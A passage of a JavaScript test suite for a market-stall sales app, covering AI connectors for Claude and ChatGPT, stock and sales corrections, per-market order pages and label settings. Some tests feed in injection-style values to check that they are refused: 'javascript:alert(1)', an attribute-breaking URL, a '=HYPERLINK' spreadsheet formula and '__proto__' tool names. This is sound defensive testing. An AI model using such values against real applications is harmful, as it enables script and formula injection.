  assert.ok(env.call('stallflow_set_price', { product_id: id, price: 110 }).data.ok);
  assert.strictEqual(find()[0].price, 110);
  assert.ok(env.call('stallflow_switch_product', { product_id: id, on: false }).data.ok);
  assert.strictEqual(find()[0].active, false, 'switched off, still there');
  assert.ok(env.call('stallflow_switch_product', { product_id: id, on: true }).data.ok);
  const mine = SF.rows('audit').filter((r) => r.Actor === 'Claude (connector)').map((r) => r.Action);
  assert.ok(['stallflow_add_product', 'stallflow_adjust_stock', 'stallflow_set_price', 'stallflow_switch_product'].every((a) => mine.indexOf(a) !== -1), mine.join());
  assert.strictEqual(env.call('stallflow_add_product', { name: 'x', price: 0 }).data.ok, false);
  assert.ok(env.call('stallflow_problems', {}).data.ok, 'support read works');
  assert.strictEqual(env.call('stallflow_stocktake', {}).data.status, 'none', 'no stocktake yet: says so');
});

test('the connector corrects a market\'s sales when the owner asks: cancel, re-record, change payment', () => {
  const env = claudeKit(), { SF } = env;
  SF.append('products', { ProductId: 'P02', Name: 'Makataan', Variant: '352 ml', Type: 'stocked', Unit: 'each', Price: 70, Active: 'Yes', Sort: 20 });
  SF.move('P02', 10, 'adjust', 'test');
  SF.append('markets', { MarketId: 'M02', Name: 'Harveston estate', Date: day(-2), Status: 'planned' });
  const c = env.owner;
  SF.dispatch('sell', { token: c, opId: 'w1', marketId: 'M02', paid: 'cash', lines: [{ id: 'P01', qty: 3 }] });
  const stock0 = SF.onHand().P01;
  const list = env.call('stallflow_sales', {}).data;
  assert.ok(list.markets.some((m) => m.id === 'M02' && m.taken > 0), 'markets listed with what they took');
  const before = env.call('stallflow_sales', { market: 'harveston' }).data;
  assert.strictEqual(before.sales.length, 1);
  assert.ok(!JSON.stringify(before).includes('Walk-up'), 'no customer field at all');
  const wrong = before.sales[0].orderNo;
  const cancelled = env.call('stallflow_cancel_sale', { order_no: wrong, reason: 'rung up wrong at Harveston' });
  assert.ok(cancelled.data.ok, JSON.stringify(cancelled));
  assert.strictEqual(SF.onHand().P01, stock0 + 3, 'its stock is back on the shelf');
  const rec = env.call('stallflow_record_sale', { market: 'M02', paid: 'card', reason: 'what really sold',
    lines: [{ product_id: 'P01', qty: 2 }, { product_id: 'P02', qty: 3 }], request_id: 'h1' });
  assert.ok(rec.data.ok, JSON.stringify(rec));
  env.call('stallflow_record_sale', { market: 'M02', paid: 'card', reason: 'again', lines: [{ product_id: 'P01', qty: 2 }], request_id: 'h1' });
  const after = env.call('stallflow_sales', { market: 'M02' }).data;
  assert.strictEqual(after.totals.sales, 1, 'the wrong sale no longer counts, the request id recorded once');
  assert.strictEqual(after.totals.units, 5);
  assert.strictEqual(after.totals.byPaid.card, 2 * 70 + 3 * 70);
  assert.strictEqual(after.sales.find((x) => x.orderNo === wrong).status, 'cancelled', 'kept on record');
  assert.ok(/recorded by Claude/.test(after.sales.find((x) => x.orderNo === rec.data.orderNo).note));
  assert.strictEqual(after.sales.find((x) => x.orderNo === rec.data.orderNo).lines[1].variant, '352 ml');
  assert.ok(env.call('stallflow_set_payment', { order_no: rec.data.orderNo, paid: 'eft', reason: 'paid by EFT' }).data.ok);
  assert.strictEqual(env.call('stallflow_sales', { market: 'M02' }).data.totals.byPaid.eft, 350);
  const dash = SF.dispatch('dashboard', { token: c, marketId: 'M02' });
  assert.ok(dash.ok === false || dash.data, 'numbers still read');
  assert.strictEqual(env.call('stallflow_record_sale', { market: 'nowhere', paid: 'cash', reason: 'x', lines: [{ product_id: 'P01', qty: 1 }] }).data.ok, false);
  assert.strictEqual(env.call('stallflow_record_sale', { market: 'M02', paid: 'bitcoin', reason: 'x', lines: [{ product_id: 'P01', qty: 1 }] }).data.ok, false);
  assert.strictEqual(env.call('stallflow_record_sale', { market: 'M02', paid: 'cash', reason: 'x', lines: [{ product_id: 'P01', qty: 500 }] }).data.ok, false);
  const p2 = SF.onHand().P02;
  assert.ok(env.call('stallflow_record_sale', { market: 'M02', paid: 'card', reason: 'sold, though the count said none',
    lines: [{ product_id: 'P02', qty: p2 + 2 }] }).data.ok, 'a correction records what really sold');
  assert.strictEqual(SF.onHand().P02, -2, 'the count goes below zero, so the next stocktake shows it');
  assert.strictEqual(SF.dispatch('sell', { token: c, opId: 'w9', marketId: 'M02', lines: [{ id: 'P02', qty: 1 }] }).ok, false,
    'the till itself still cannot sell what is not there');
  const audit = SF.rows('audit').filter((r) => r.Actor === 'Claude (connector)').map((r) => r.Action);
  ['stallflow_cancel_sale', 'stallflow_record_sale', 'stallflow_set_payment'].forEach((a) => assert.ok(audit.indexOf(a) !== -1, a));
});

test('a new key replaces the old one, switching off ends it, and the hourly limit holds', () => {
  const env = claudeKit(), { SF } = env;
  const old = env.key;
  const fresh = SF.dispatch('assistantKey', { token: env.owner, opId: 'k2' }).key;
  assert.strictEqual(SF.mcp(old, { jsonrpc: '2.0', id: 1, method: 'tools/list' }).error.code, -32001);
  assert.ok(SF.mcp(fresh, { jsonrpc: '2.0', id: 1, method: 'tools/list' }).reply.result);
  for (let i = 0; i < SF.ASSISTANT_PER_HOUR; i++) SF.mcp(fresh, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'stallflow_stock', arguments: {} } });
  const over = SF.mcp(fresh, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'stallflow_stock', arguments: {} } }).reply.result;
  assert.strictEqual(over.isError, true);
  SF.dispatch('assistantOff', { token: env.owner, opId: 'off' });
  assert.strictEqual(SF.mcp(fresh, { jsonrpc: '2.0', id: 1, method: 'tools/list' }).error.code, -32001);
});

/* ---------- ChatGPT as a design connector ---------- */
function designKit() {
  const env = claudeKit();
  const { SF } = env;
  env.dkey = SF.dispatch('designKey', { token: env.owner, opId: 'd' + Math.random(),
    site: 'https://stallflow.github.io/Stallflow/duxies/app/' }).key;
  env.drpc = (method, params, key) => SF.mcpDesign(key === undefined ? env.dkey : key, { jsonrpc: '2.0', id: 7, method, params });
  env.dcall = (name, args) => {
    const r = env.drpc('tools/call', { name, arguments: args }).reply;
    return { isError: r.result.isError, data: JSON.parse(r.result.content[0].text) };
  };
  return env;
}

test('ChatGPT design connector: only the administrator makes it, and its key is separate from Claude\'s', () => {
  const env = designKit(), { SF } = env;
  assert.ok(env.dkey && env.dkey !== env.key);
  [env.manager, env.stallOwner].forEach((t, i) => {
    assert.strictEqual(SF.dispatch('designKey', { token: t, opId: 'dm' + i }).code, 'forbidden');
    assert.strictEqual(SF.dispatch('designOff', { token: t, opId: 'do' + i }).code, 'forbidden');
  });
  assert.strictEqual(SF.mcpDesign(env.key, { jsonrpc: '2.0', id: 1, method: 'tools/list' }).error.code, -32001, 'Claude\'s key does not open ChatGPT\'s door');
  assert.strictEqual(SF.mcp(env.dkey, { jsonrpc: '2.0', id: 1, method: 'tools/list' }).error.code, -32001, 'and the other way round');
  assert.ok(!JSON.stringify(SF.rows('settings')).includes(env.dkey), 'only the hash is kept');
  const st = SF.dispatch('designStatus', { token: env.owner }).data;
  assert.strictEqual(st.on, true);
  assert.strictEqual(st.site, 'https://stallflow.github.io/Stallflow/duxies/', 'the app address becomes the site address');
  SF.dispatch('designOff', { token: env.owner, opId: 'off2' });
  assert.strictEqual(env.drpc('tools/list', {}).error.code, -32001);
  assert.ok(env.rpc('tools/list', {}).reply.result, 'switching ChatGPT off leaves Claude on');
});

test('ChatGPT design connector: a fixed list of tools, all read-only bar the design note', () => {
  const env = designKit();
  const tools = env.drpc('tools/list', {}).reply.result.tools;
  assert.strictEqual(tools.map((t) => t.name).sort().join(), 'brand_kit,fetch,order_pages,product_list,save_design_note,search');
  tools.forEach((t) => assert.strictEqual(t.annotations.readOnlyHint, t.name !== 'save_design_note', t.name));
  ['stallflow_set_price', 'stallflow_adjust_stock', 'saveProfile', 'sell', 'constructor', '__proto__'].forEach((n) => {
    assert.strictEqual(env.dcall(n, {}).data.ok, false, n + ' is not there');
  });
  assert.ok(env.drpc('initialize', { protocolVersion: '2025-06-18' }).reply.result.instructions.includes('brand_kit'));
});

test('ChatGPT design connector: reads brand, products and links, never cost, orders or customers', () => {
  const env = designKit(), { SF } = env;
  SF.dispatch('saveProfile', { token: env.owner, opId: 'pf', name: "Duxie's Homemade", colour: '#aa3355', tagline: 'Small batch' });
  const brand = env.dcall('brand_kit', {}).data.brand;
  assert.strictEqual(brand.name, "Duxie's Homemade"); assert.strictEqual(brand.colours.main, '#aa3355');
  assert.strictEqual(brand.links.betweenMarkets, 'https://stallflow.github.io/Stallflow/duxies/?m=home');
  assert.strictEqual(brand.labels.logo, undefined, 'the logo only when asked');
  const prods = env.dcall('product_list', {}).data.products;
  assert.ok(prods.length > 0);
  prods.forEach((p) => { assert.ok(!('cost' in p) && !('margin' in p) && !('marginPct' in p), 'no cost prices'); });
  const found = env.dcall('search', { query: prods[0].name.split(' ')[0] }).data.results;
  assert.ok(found.some((r) => r.id === prods[0].id));
  const one = env.dcall('fetch', { id: prods[0].id }).data;
  assert.ok(one.ok && JSON.parse(one.text).price === prods[0].price && !one.text.includes('cost'));
  assert.ok(env.dcall('fetch', { id: 'brand' }).data.text.includes('colours'));
  assert.strictEqual(env.dcall('fetch', { id: 'P999' }).data.ok, false);
  assert.ok(Array.isArray(env.dcall('order_pages', {}).data.links.markets));
  const everything = JSON.stringify(['brand_kit', 'product_list', 'order_pages'].map((n) => env.dcall(n, { include_logo: true, include_hidden: true })));
  assert.ok(!/"(phone|eft|Lines|Total|cost|margin)"/.test(everything), 'nothing about money, orders or customers');
});

test('ChatGPT design connector: the design note is the only change, recorded as ChatGPT, once per request id', () => {
  const env = designKit(), { SF } = env;
  const before = JSON.stringify(SF.rows('products')) + JSON.stringify(SF.rows('movements'));
  assert.ok(env.dcall('save_design_note', { note: '=HYPERLINK("x") Christmas poster made', request_id: 'n1' }).data.ok);
  env.dcall('save_design_note', { note: 'second try', request_id: 'n1' });
  const st = SF.dispatch('designStatus', { token: env.owner }).data;
  assert.ok(st.note.includes('Christmas poster made'), 'the same request id saves once');
  assert.ok(st.noteAt);
  assert.strictEqual(env.dcall('save_design_note', { note: '   ' }).data.ok, false);
  assert.ok(env.dcall('save_design_note', { note: 'x'.repeat(900) }).data.ok);
  assert.strictEqual(SF.dispatch('designStatus', { token: env.owner }).data.note.length, SF.DESIGN_NOTE_MAX);
  assert.strictEqual(JSON.stringify(SF.rows('products')) + JSON.stringify(SF.rows('movements')), before, 'nothing else changed');
  assert.ok(SF.rows('audit').some((r) => r.Actor === 'ChatGPT (design connector)' && r.Action === 'save_design_note'));
  assert.ok(!SF.rows('audit').some((r) => r.Actor === 'ChatGPT (design connector)' && /brand_kit|product_list/.test(r.Action)), 'reads are not written to the audit trail');
});

test('a bad site address is not kept', () => {
  const { SF } = shop(day(3));
  ['javascript:alert(1)', 'http://x.y/', 'https://a.b/"onx', ''].forEach((u) => assert.strictEqual(SF.cleanSite(u), '', u));
  assert.strictEqual(SF.cleanSite('https://stallflow.github.io/Stallflow/duxies/index.html?m=1'), 'https://stallflow.github.io/Stallflow/duxies/');
});

test('a new product never takes an id that is already in use', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  // 98 more products: ids P02..P99, then one more must not wrap round to P01
  for (let i = 2; i <= 99; i++) SF.append('products', { ProductId: 'P' + (i < 10 ? '0' + i : i), Name: 'Item ' + i, Type: 'stocked', Unit: 'each', Price: 10, Active: 'Yes', Sort: i * 10 });
  const r = SF.dispatch('saveProduct', { token: tok, opId: 'big1', name: 'Lizard resin ornament', category: 'Resin', type: 'stocked', unit: 'each', price: 105, qty: 1 });
  assert.strictEqual(r.id, 'P100');
  const ids = SF.rows('products').map((x) => x.ProductId);
  assert.strictEqual(new Set(ids).size, ids.length, 'every id is unique');
  assert.strictEqual(SF.products({ all: true }).filter((x) => x.id === 'P01')[0].onHand, 10, 'Apricot Jam is untouched');
});

test('the middle jar size is renamed to 250 ml, and nothing else about the product changes', () => {
  const env = shop(day(3));
  const { SF, ctx } = env;
  SF.append('products', { ProductId: 'P77', Name: 'Apricot', Variant: 'Medium (odd bottle)', Category: 'Jams', Type: 'stocked', Unit: 'each', Price: 50, Active: 'Yes', Sort: 30 });
  SF.append('products', { ProductId: 'P78', Name: 'Fig', Variant: 'Medium jar, by hand', Category: 'Jams', Type: 'stocked', Unit: 'each', Price: 60, Active: 'Yes', Sort: 31 });
  SF.move('P77', 2, 'adjust', 'test');
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const fix = vm.runInContext('sfDataFixes()', ctx).filter((f) => f.id === 'medium-is-250ml')[0];
  assert.strictEqual(fix.run(), true);
  const p = SF.products({ all: true });
  const a = p.find((x) => x.id === 'P77');
  assert.strictEqual(a.variant, '250 ml'); assert.strictEqual(a.price, 50); assert.strictEqual(a.onHand, 2);
  assert.strictEqual(p.find((x) => x.id === 'P78').variant, 'Medium jar, by hand', 'a hand edit is left alone');
  assert.strictEqual(fix.run(), false, 'running it again changes nothing');
});

test('the shared-id mistake is repaired: the ornament gets its own id and takes its stock with it', () => {
  const env = shop(day(3));
  const { SF, ctx } = env;
  // what the live sheet looks like: the ornament added under P01, with its opening stock on P01
  SF.append('products', { ProductId: 'P01', Name: 'Lizard resin ornament', Category: 'Resin', Type: 'stocked', Unit: 'each', Price: 105, Active: 'Yes', Sort: 20 });
  SF.move('P01', 1, 'adjust', 'Opening stock');
  assert.strictEqual(SF.products({ all: true }).filter((x) => x.id === 'P01')[0].onHand, 11, 'both are counted together');
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const fixes = vm.runInContext('sfDataFixes()', ctx).filter((f) => f.id === 'lizard-own-id');
  assert.strictEqual(fixes[0].run(), true);
  const by = (id) => SF.products({ all: true }).filter((x) => x.id === id);
  assert.strictEqual(by('P01').length, 1); assert.strictEqual(by('P01')[0].onHand, 10, 'Apricot Jam is back to its own stock');
  const liz = SF.products({ all: true }).filter((x) => /lizard/i.test(x.name))[0];
  assert.notStrictEqual(liz.id, 'P01'); assert.strictEqual(liz.onHand, 1);
  assert.strictEqual(fixes[0].run(), false, 'nothing left to repair');
});

test('a lizard sale recorded as Apricot Jam is put right: the order, the money, and both stocks', () => {
  const env = shop(day(0));
  const { SF, ctx } = env;
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const wait = (ms) => { const t = Date.now() + ms; while (Date.now() < t); };
  // an Apricot Jam sale from before the ornament existed: must be left alone
  assert.ok(SF.dispatch('sell', { token: tok, opId: 's0', lines: [{ id: 'P01', qty: 1 }], paid: 'cash' }).ok);
  wait(5);
  SF.append('products', { ProductId: 'P01', Name: 'Lizard resin ornament', Category: 'Resin', Type: 'stocked', Unit: 'each', Price: 105, Active: 'Yes', Sort: 20 });
  SF.move('P01', 1, 'adjust', 'Opening stock');
  wait(5);
  // the lizard rung up at the till: recorded under P01, so as Apricot Jam
  const sale = SF.dispatch('sell', { token: tok, opId: 's1', lines: [{ id: 'P01', qty: 1 }], paid: 'cash' });
  assert.ok(sale.ok, JSON.stringify(sale));
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const fixes = vm.runInContext('sfDataFixes()', ctx);
  fixes.filter((f) => f.id === 'lizard-own-id')[0].run();
  const sales = fixes.filter((f) => f.id === 'lizard-sales')[0];
  assert.strictEqual(sales.run(), true);
  const orders = SF.orders().filter((o) => o.status !== 'cancelled');
  const early = orders.filter((o) => o.no === orders[0].no)[0], late = orders[orders.length - 1];
  assert.strictEqual(early.lines[0].name, 'Apricot Jam', 'the earlier sale is untouched');
  assert.strictEqual(late.lines[0].name, 'Lizard resin ornament'); assert.strictEqual(late.total, 105); assert.strictEqual(late.units, 1);
  const stock = (re) => SF.products({ all: true }).filter((x) => re.test(x.name))[0].onHand;
  assert.strictEqual(stock(/Apricot/), 9, 'Apricot Jam: 10, less its own one sale');
  assert.strictEqual(stock(/Lizard/), 0, 'the one ornament is sold');
  assert.strictEqual(sales.run(), false, 'repeating changes nothing');
  assert.strictEqual(stock(/Lizard/), 0);
});

test('cashing up closes that market: off the till, cash-up counts the phone\'s market, Reopen puts it back', () => {
  const env = shop(day(0));
  const { SF } = env;
  SF.append('markets', { MarketId: 'M02', Name: 'Second Market', Date: day(0), Status: 'planned' });
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  assert.ok(SF.dispatch('sell', { token: tok, opId: 'a1', marketId: 'M02', lines: [{ id: 'P01', qty: 1 }], paid: 'cash' }).ok);
  const exp = SF.dispatch('cashup.expected', { token: tok, marketId: 'M02' });
  assert.strictEqual(exp.marketId, 'M02', 'the phone\'s market, not the live one');
  assert.ok(exp.cash > 0);
  const rec = SF.dispatch('cashup.record', { token: tok, opId: 'c1', marketId: 'M02', counted: exp.expectedInTin, note: '' });
  assert.ok(rec.ok, JSON.stringify(rec));
  let till = SF.dispatch('till', { token: tok }).data;
  assert.strictEqual(till.markets.filter((m) => m.id === 'M02').length, 0, 'gone from the picker');
  assert.strictEqual(till.running.filter((m) => m.id === 'M02').length, 0, 'gone from Markets today');
  assert.ok(till.markets.some((m) => m.id === 'M01'), 'the other market stays');
  const hist = SF.dispatch('dashboard', { token: tok, marketId: 'M02' }).data.history.filter((h) => h.id === 'M02')[0];
  assert.strictEqual(hist.cashed, true, 'Numbers keeps it, marked cashed up');
  assert.strictEqual(SF.dispatch('reopenMarket', { token: tok, opId: 'r1', id: 'M02' }).ok, true);
  till = SF.dispatch('till', { token: tok }).data;
  assert.ok(till.markets.some((m) => m.id === 'M02'), 'back on the till');
  assert.strictEqual(SF.dispatch('reopenMarket', { token: tok, opId: 'r2', id: 'M02' }).ok, false, 'nothing to reopen twice');
});

test('the Caroline test market is removed only while nothing is recorded against it', () => {
  const env = shop(day(3));
  const { SF, ctx } = env;
  SF.append('markets', { MarketId: 'M07', Name: 'Caroline', Date: day(300), Location: 'Lyttelton', Status: 'planned' });
  SF.append('markets', { MarketId: 'M08', Name: 'Caroline', Date: day(301), Location: 'Lyttelton', Status: 'planned' });
  SF.append('expenses', { ExpenseId: 'E1', MarketId: 'M08', Description: 'Stall', Amount: 50, Category: 'Stall', When: new Date() });
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const fix = vm.runInContext('sfDataFixes()', ctx).filter((f) => f.id === 'remove-caroline-test-market')[0];
  assert.strictEqual(fix.run(), true);
  const ids = SF.rows('markets').map((m) => m.MarketId).join(',');
  assert.ok(ids.indexOf('M07') < 0, 'the empty one is gone');
  assert.ok(ids.indexOf('M08') >= 0, 'one with a cost against it stays');
  assert.ok(ids.indexOf('M01') >= 0, 'other markets stay');
  assert.strictEqual(fix.run(), false);
});

test('the live Caroline test market: its test pre-order cancelled, the last real market goes live, Caroline is deleted', () => {
  const env = shop(day(-8));                         // M01: a real market, been and gone
  const { SF, ctx } = env;
  SF.append('markets', { MarketId: 'M02', Name: 'Harveston estate', Date: day(-8 + 1), Status: 'planned' });
  SF.append('markets', { MarketId: 'M04', Name: 'Caroline', Date: '2027-11-01', Location: 'Lyttelton', Status: 'cashed up' });
  SF.set('activeMarket', 'M04');
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.set('preordersOpen', 'yes');
  const o = order(SF, { market: 'M04' });
  assert.ok(o.ok, JSON.stringify(o));
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', 'Fixes.gs'), 'utf8'), ctx);
  const fix = vm.runInContext('sfDataFixes()', ctx).filter((f) => f.id === 'caroline-test-market-deleted')[0];
  assert.strictEqual(fix.run(), false, 'not while a pre-order is still open against it');
  SF.dispatch('cancelOrder', { token: tok, opId: 'c1', orderNo: o.orderNo });
  assert.strictEqual(fix.run(), true);
  assert.strictEqual(SF.activeMarket(), 'M02', 'the most recent real market is live');
  assert.ok(!SF.markets().some((m) => m.id === 'M04'), 'Caroline is gone from every list');
  assert.strictEqual(SF.onHand().P01, 10, 'the stock is all back');
  assert.strictEqual(fix.run(), false, 'running it again changes nothing');
});

test('uncooked stock is a list she can add to and update', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('savePantry', { token: tok, opId: 'p1', item: 'Sugar', qty: 5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'p2', item: 'sugar', qty: 2.5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'p3', item: '352 ml bottles', qty: 24, unit: 'each' });
  const p = SF.dispatch('stock', { token: tok }).data.pantry;
  assert.strictEqual(JSON.stringify(p.map((r) => [r.item, r.qty])), '[["352 ml bottles",24],["Sugar",2.5]]');
  assert.strictEqual(SF.dispatch('savePantry', { token: tok, opId: 'p4', item: 'x', qty: 1 }).ok, false);
});

/* ---------- an order page for every market, and one between markets ---------- */

function markets3() {
  const env = shop(day(3));                       // M01, live, in three days
  env.SF.append('markets', { MarketId: 'M02', Name: 'Monument Primary', Date: day(10), Status: 'planned' });
  env.SF.append('markets', { MarketId: 'M03', Name: 'Last Month', Date: day(-20), Status: 'planned' });
  env.SF.setPin('owner', '4321');
  env.tok = env.SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  return env;
}
const cat = (SF, market) => SF.dispatch('catalogue', market === undefined ? {} : { market }).data;

test('each market has its own order page, and past ones are closed', () => {
  const { SF } = markets3();
  assert.strictEqual(cat(SF).market.id, 'M01', 'no ?m= is the live market');
  assert.strictEqual(cat(SF).open, true);
  assert.strictEqual(cat(SF, 'M02').market.name, 'Monument Primary');
  assert.strictEqual(cat(SF, 'M02').open, true);
  assert.strictEqual(cat(SF, 'M03').open, false);
  assert.strictEqual(cat(SF, 'nonsense').open, false);
  assert.strictEqual(cat(SF, 'nonsense').market, null);
  assert.strictEqual(JSON.stringify(cat(SF).markets.map((m) => m.id)), '["M01","M02","home"]',
                     'soonest first, past ones left out, between markets last');
});

test('an order from a market page belongs to that market and shows in its queue', () => {
  const { SF, sheets, tok } = markets3();
  const r = order(SF, { market: 'M02' });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(r.market.name, 'Monument Primary');
  const row = sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  assert.strictEqual(row[2], 'M02');
  const here = SF.dispatch('queue', { token: tok, marketId: 'M02' }).data;
  const live = SF.dispatch('queue', { token: tok }).data;
  assert.ok(here.unpaid.some((o) => o.no === r.orderNo), 'in the M02 queue');
  assert.ok(!live.unpaid.some((o) => o.no === r.orderNo), 'not in the live market queue');
  assert.ok(SF.dispatch('till', { token: tok, marketId: 'M02' }).data.unpaid.some((o) => o.no === r.orderNo));
});

test('a past market refuses orders while the others still take them', () => {
  const { SF } = markets3();
  const refused = order(SF, { market: 'M03' });
  assert.strictEqual(refused.ok, false);
  assert.strictEqual(refused.code, 'closed');
  assert.strictEqual(order(SF, { market: 'M02' }).ok, true);
});

test('orders between markets are always open, and can be switched off', () => {
  const { SF, sheets, tok } = markets3();
  const home = cat(SF, 'home');
  assert.strictEqual(home.open, true);
  assert.strictEqual(home.market.home, true);
  assert.ok(/collected/.test(home.consentText), home.consentText);
  const r = order(SF, { market: 'home' });
  assert.strictEqual(r.ok, true, r.message);
  assert.strictEqual(sheets.Orders.rows.find((x) => x[0] === r.orderNo)[2], 'HOME');
  assert.ok(SF.dispatch('queue', { token: tok, marketId: 'home' }).data.unpaid.some((o) => o.no === r.orderNo));
  SF.dispatch('setHomeOrders', { token: tok, opId: 'h0', open: false });
  assert.strictEqual(cat(SF, 'home').open, false);
  assert.strictEqual(order(SF, { market: 'home' }).ok, false);
  assert.ok(!cat(SF).markets.some((m) => m.id === 'home'));
});

test('switching pre-orders off closes every market page', () => {
  const { SF, tok } = markets3();
  SF.dispatch('setPreordersOpen', { token: tok, opId: 'p0', open: false });
  ['M01', 'M02', 'home'].forEach((m) => assert.strictEqual(cat(SF, m).open, false, m));
  assert.strictEqual(cat(SF).markets.length, 0);
});

test('a between-markets customer keeps their details until the order is handed over', () => {
  const { SF, sheets, tok } = markets3();
  const r = order(SF, { market: 'home', name: 'Thabo Nkosi' });
  const row = () => sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  SF.purgeCustomers();
  assert.strictEqual(row()[4], 'Thabo Nkosi', 'still waiting, so the name stays');
  SF.dispatch('markPaid', { token: tok, opId: 'mp', orderNo: r.orderNo });
  SF.dispatch('markCollected', { token: tok, opId: 'mc', orderNo: r.orderNo });
  SF.purgeCustomers();
  assert.strictEqual(row()[4], 'Customer', 'handed over, so the name goes');
  assert.strictEqual(row()[5], '');
});

test('made-to-order capacity is counted per market', () => {
  const { SF, tok } = markets3();
  SF.append('products', { ProductId: 'P09', Name: 'Coffee', Type: 'made', Unit: 'each', Price: 30,
                          Capacity: 2, Active: 'Yes', Sort: 90 });
  assert.strictEqual(order(SF, { market: 'M01', lines: [{ id: 'P09', qty: 2 }] }).ok, true);
  const avail = (m) => cat(SF, m).products.find((p) => p.id === 'P09').available;
  assert.strictEqual(avail('M01'), 0);
  assert.strictEqual(avail('M02'), 2, 'another market has its own capacity');
  assert.strictEqual(SF.dispatch('till', { token: tok, marketId: 'M02' }).data.products
    .find((p) => p.id === 'P09').available, 2);
});

test('stock taken by an order is recorded against the market it is for', () => {
  const { SF, sheets } = markets3();
  const r = order(SF, { market: 'M02' });
  const mv = sheets.Movements.rows.find((x) => x[4] === r.orderNo);
  assert.strictEqual(mv[5], 'M02');
});

/* ---------- paying is handing over, unless the stall has a Collect step ---------- */

test('without a Collect step, Paid at the till also hands the order over', () => {
  const { SF, sheets, tok } = markets3();
  assert.strictEqual(SF.dispatch('boot', { token: tok }).data.collect, false, 'off by default');
  const r = order(SF, { market: 'M01' });
  const res = SF.dispatch('markPaid', { token: tok, opId: 'pay1', orderNo: r.orderNo });
  assert.strictEqual(res.handedOver, true);
  const row = sheets.Orders.rows.find((x) => x[0] === r.orderNo);
  assert.strictEqual(row[10], 'collected');
  assert.ok(row[11] && row[11].getTime && row[12] && row[12].getTime, 'paid and collected times are set');
  assert.strictEqual(SF.dispatch('till', { token: tok, marketId: 'M01' }).data.unpaid.length, 0);
});

test('with the Collect step switched on, Paid waits for the hand-over', () => {
  const { SF, sheets, tok } = markets3();
  SF.dispatch('setCollectStep', { token: tok, opId: 'cs', on: true });
  assert.strictEqual(SF.dispatch('boot', { token: tok }).data.collect, true);
  const r = order(SF, { market: 'M01' });
  SF.dispatch('markPaid', { token: tok, opId: 'pay2', orderNo: r.orderNo });
  assert.strictEqual(sheets.Orders.rows.find((x) => x[0] === r.orderNo)[10], 'paid');
  const till = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  assert.ok(till.waiting.some((o) => o.no === r.orderNo), 'the till can see it is waiting');
});

/* ---------- the label look ---------- */

test('the order page knows the owner name and WhatsApp number, and the reply carries the note', () => {
  const { SF, tok } = markets3();
  SF.dispatch('saveProfile', { token: tok, opId: 'pf', ownerName: 'Marian', whatsapp: '066 000 0000' });
  const prof = SF.dispatch('catalogue', {}).data.profile;
  assert.strictEqual(prof.ownerName, 'Marian');
  assert.strictEqual(prof.whatsapp, '066 000 0000');
  const r = order(SF, { market: 'M01', note: 'After 11 please' });
  assert.strictEqual(r.note, 'After 11 please');
});

test('the label look is kept: style, contact lines, a small logo, price on or off', () => {
  const { SF, tok } = markets3();
  let look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.style, 'classic', 'starts in the style of the printed labels');
  assert.strictEqual(look.price, false, 'no price on the label unless asked');
  const logo = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGNgAAAAAgABSK+kcQAAAABJRU5ErkJggg==';
  const r = SF.dispatch('saveLabelLook', { token: tok, opId: 'll1', style: 'classic',
    contact: 'Marian\r\nMobile 066 000 0000\nthird\nfourth line is dropped', logo, price: true });
  assert.strictEqual(r.ok, true, r.message);
  look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.contact, 'Marian\nMobile 066 000 0000\nthird');
  assert.strictEqual(look.logo, logo);
  assert.strictEqual(look.price, true);
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: tok, opId: 'll2', logo: 'javascript:alert(1)' }).ok, false);
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: tok, opId: 'll3',
    logo: 'data:image/png;base64,' + 'A'.repeat(70000) }).ok, false, 'too big to keep');
  SF.dispatch('saveLabelLook', { token: tok, opId: 'll4', style: 'simple', contact: '', price: false });
  look = SF.dispatch('labels', { token: tok }).data.look;
  assert.strictEqual(look.style, 'simple');
  assert.strictEqual(look.logo, logo, 'leaving the logo out keeps it');
});

test('only an owner or manager can change the label look', () => {
  const { SF } = markets3();
  SF.setPin('cashier', '1111');
  const t = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
  assert.strictEqual(SF.dispatch('saveLabelLook', { token: t, opId: 'x', contact: 'hi' }).ok, false);
});

/* ---------- stocktake ---------- */

function counting() {
  const env = markets3();                         // owner signed in; P01 Apricot Jam, 10 on hand
  const SF = env.SF;
  SF.append('products', { ProductId: 'P02', Name: 'Fig Jam', Type: 'stocked', Unit: 'each', Price: 80, Active: 'Yes', Sort: 20 });
  SF.move('P02', 6, 'adjust', 'test');
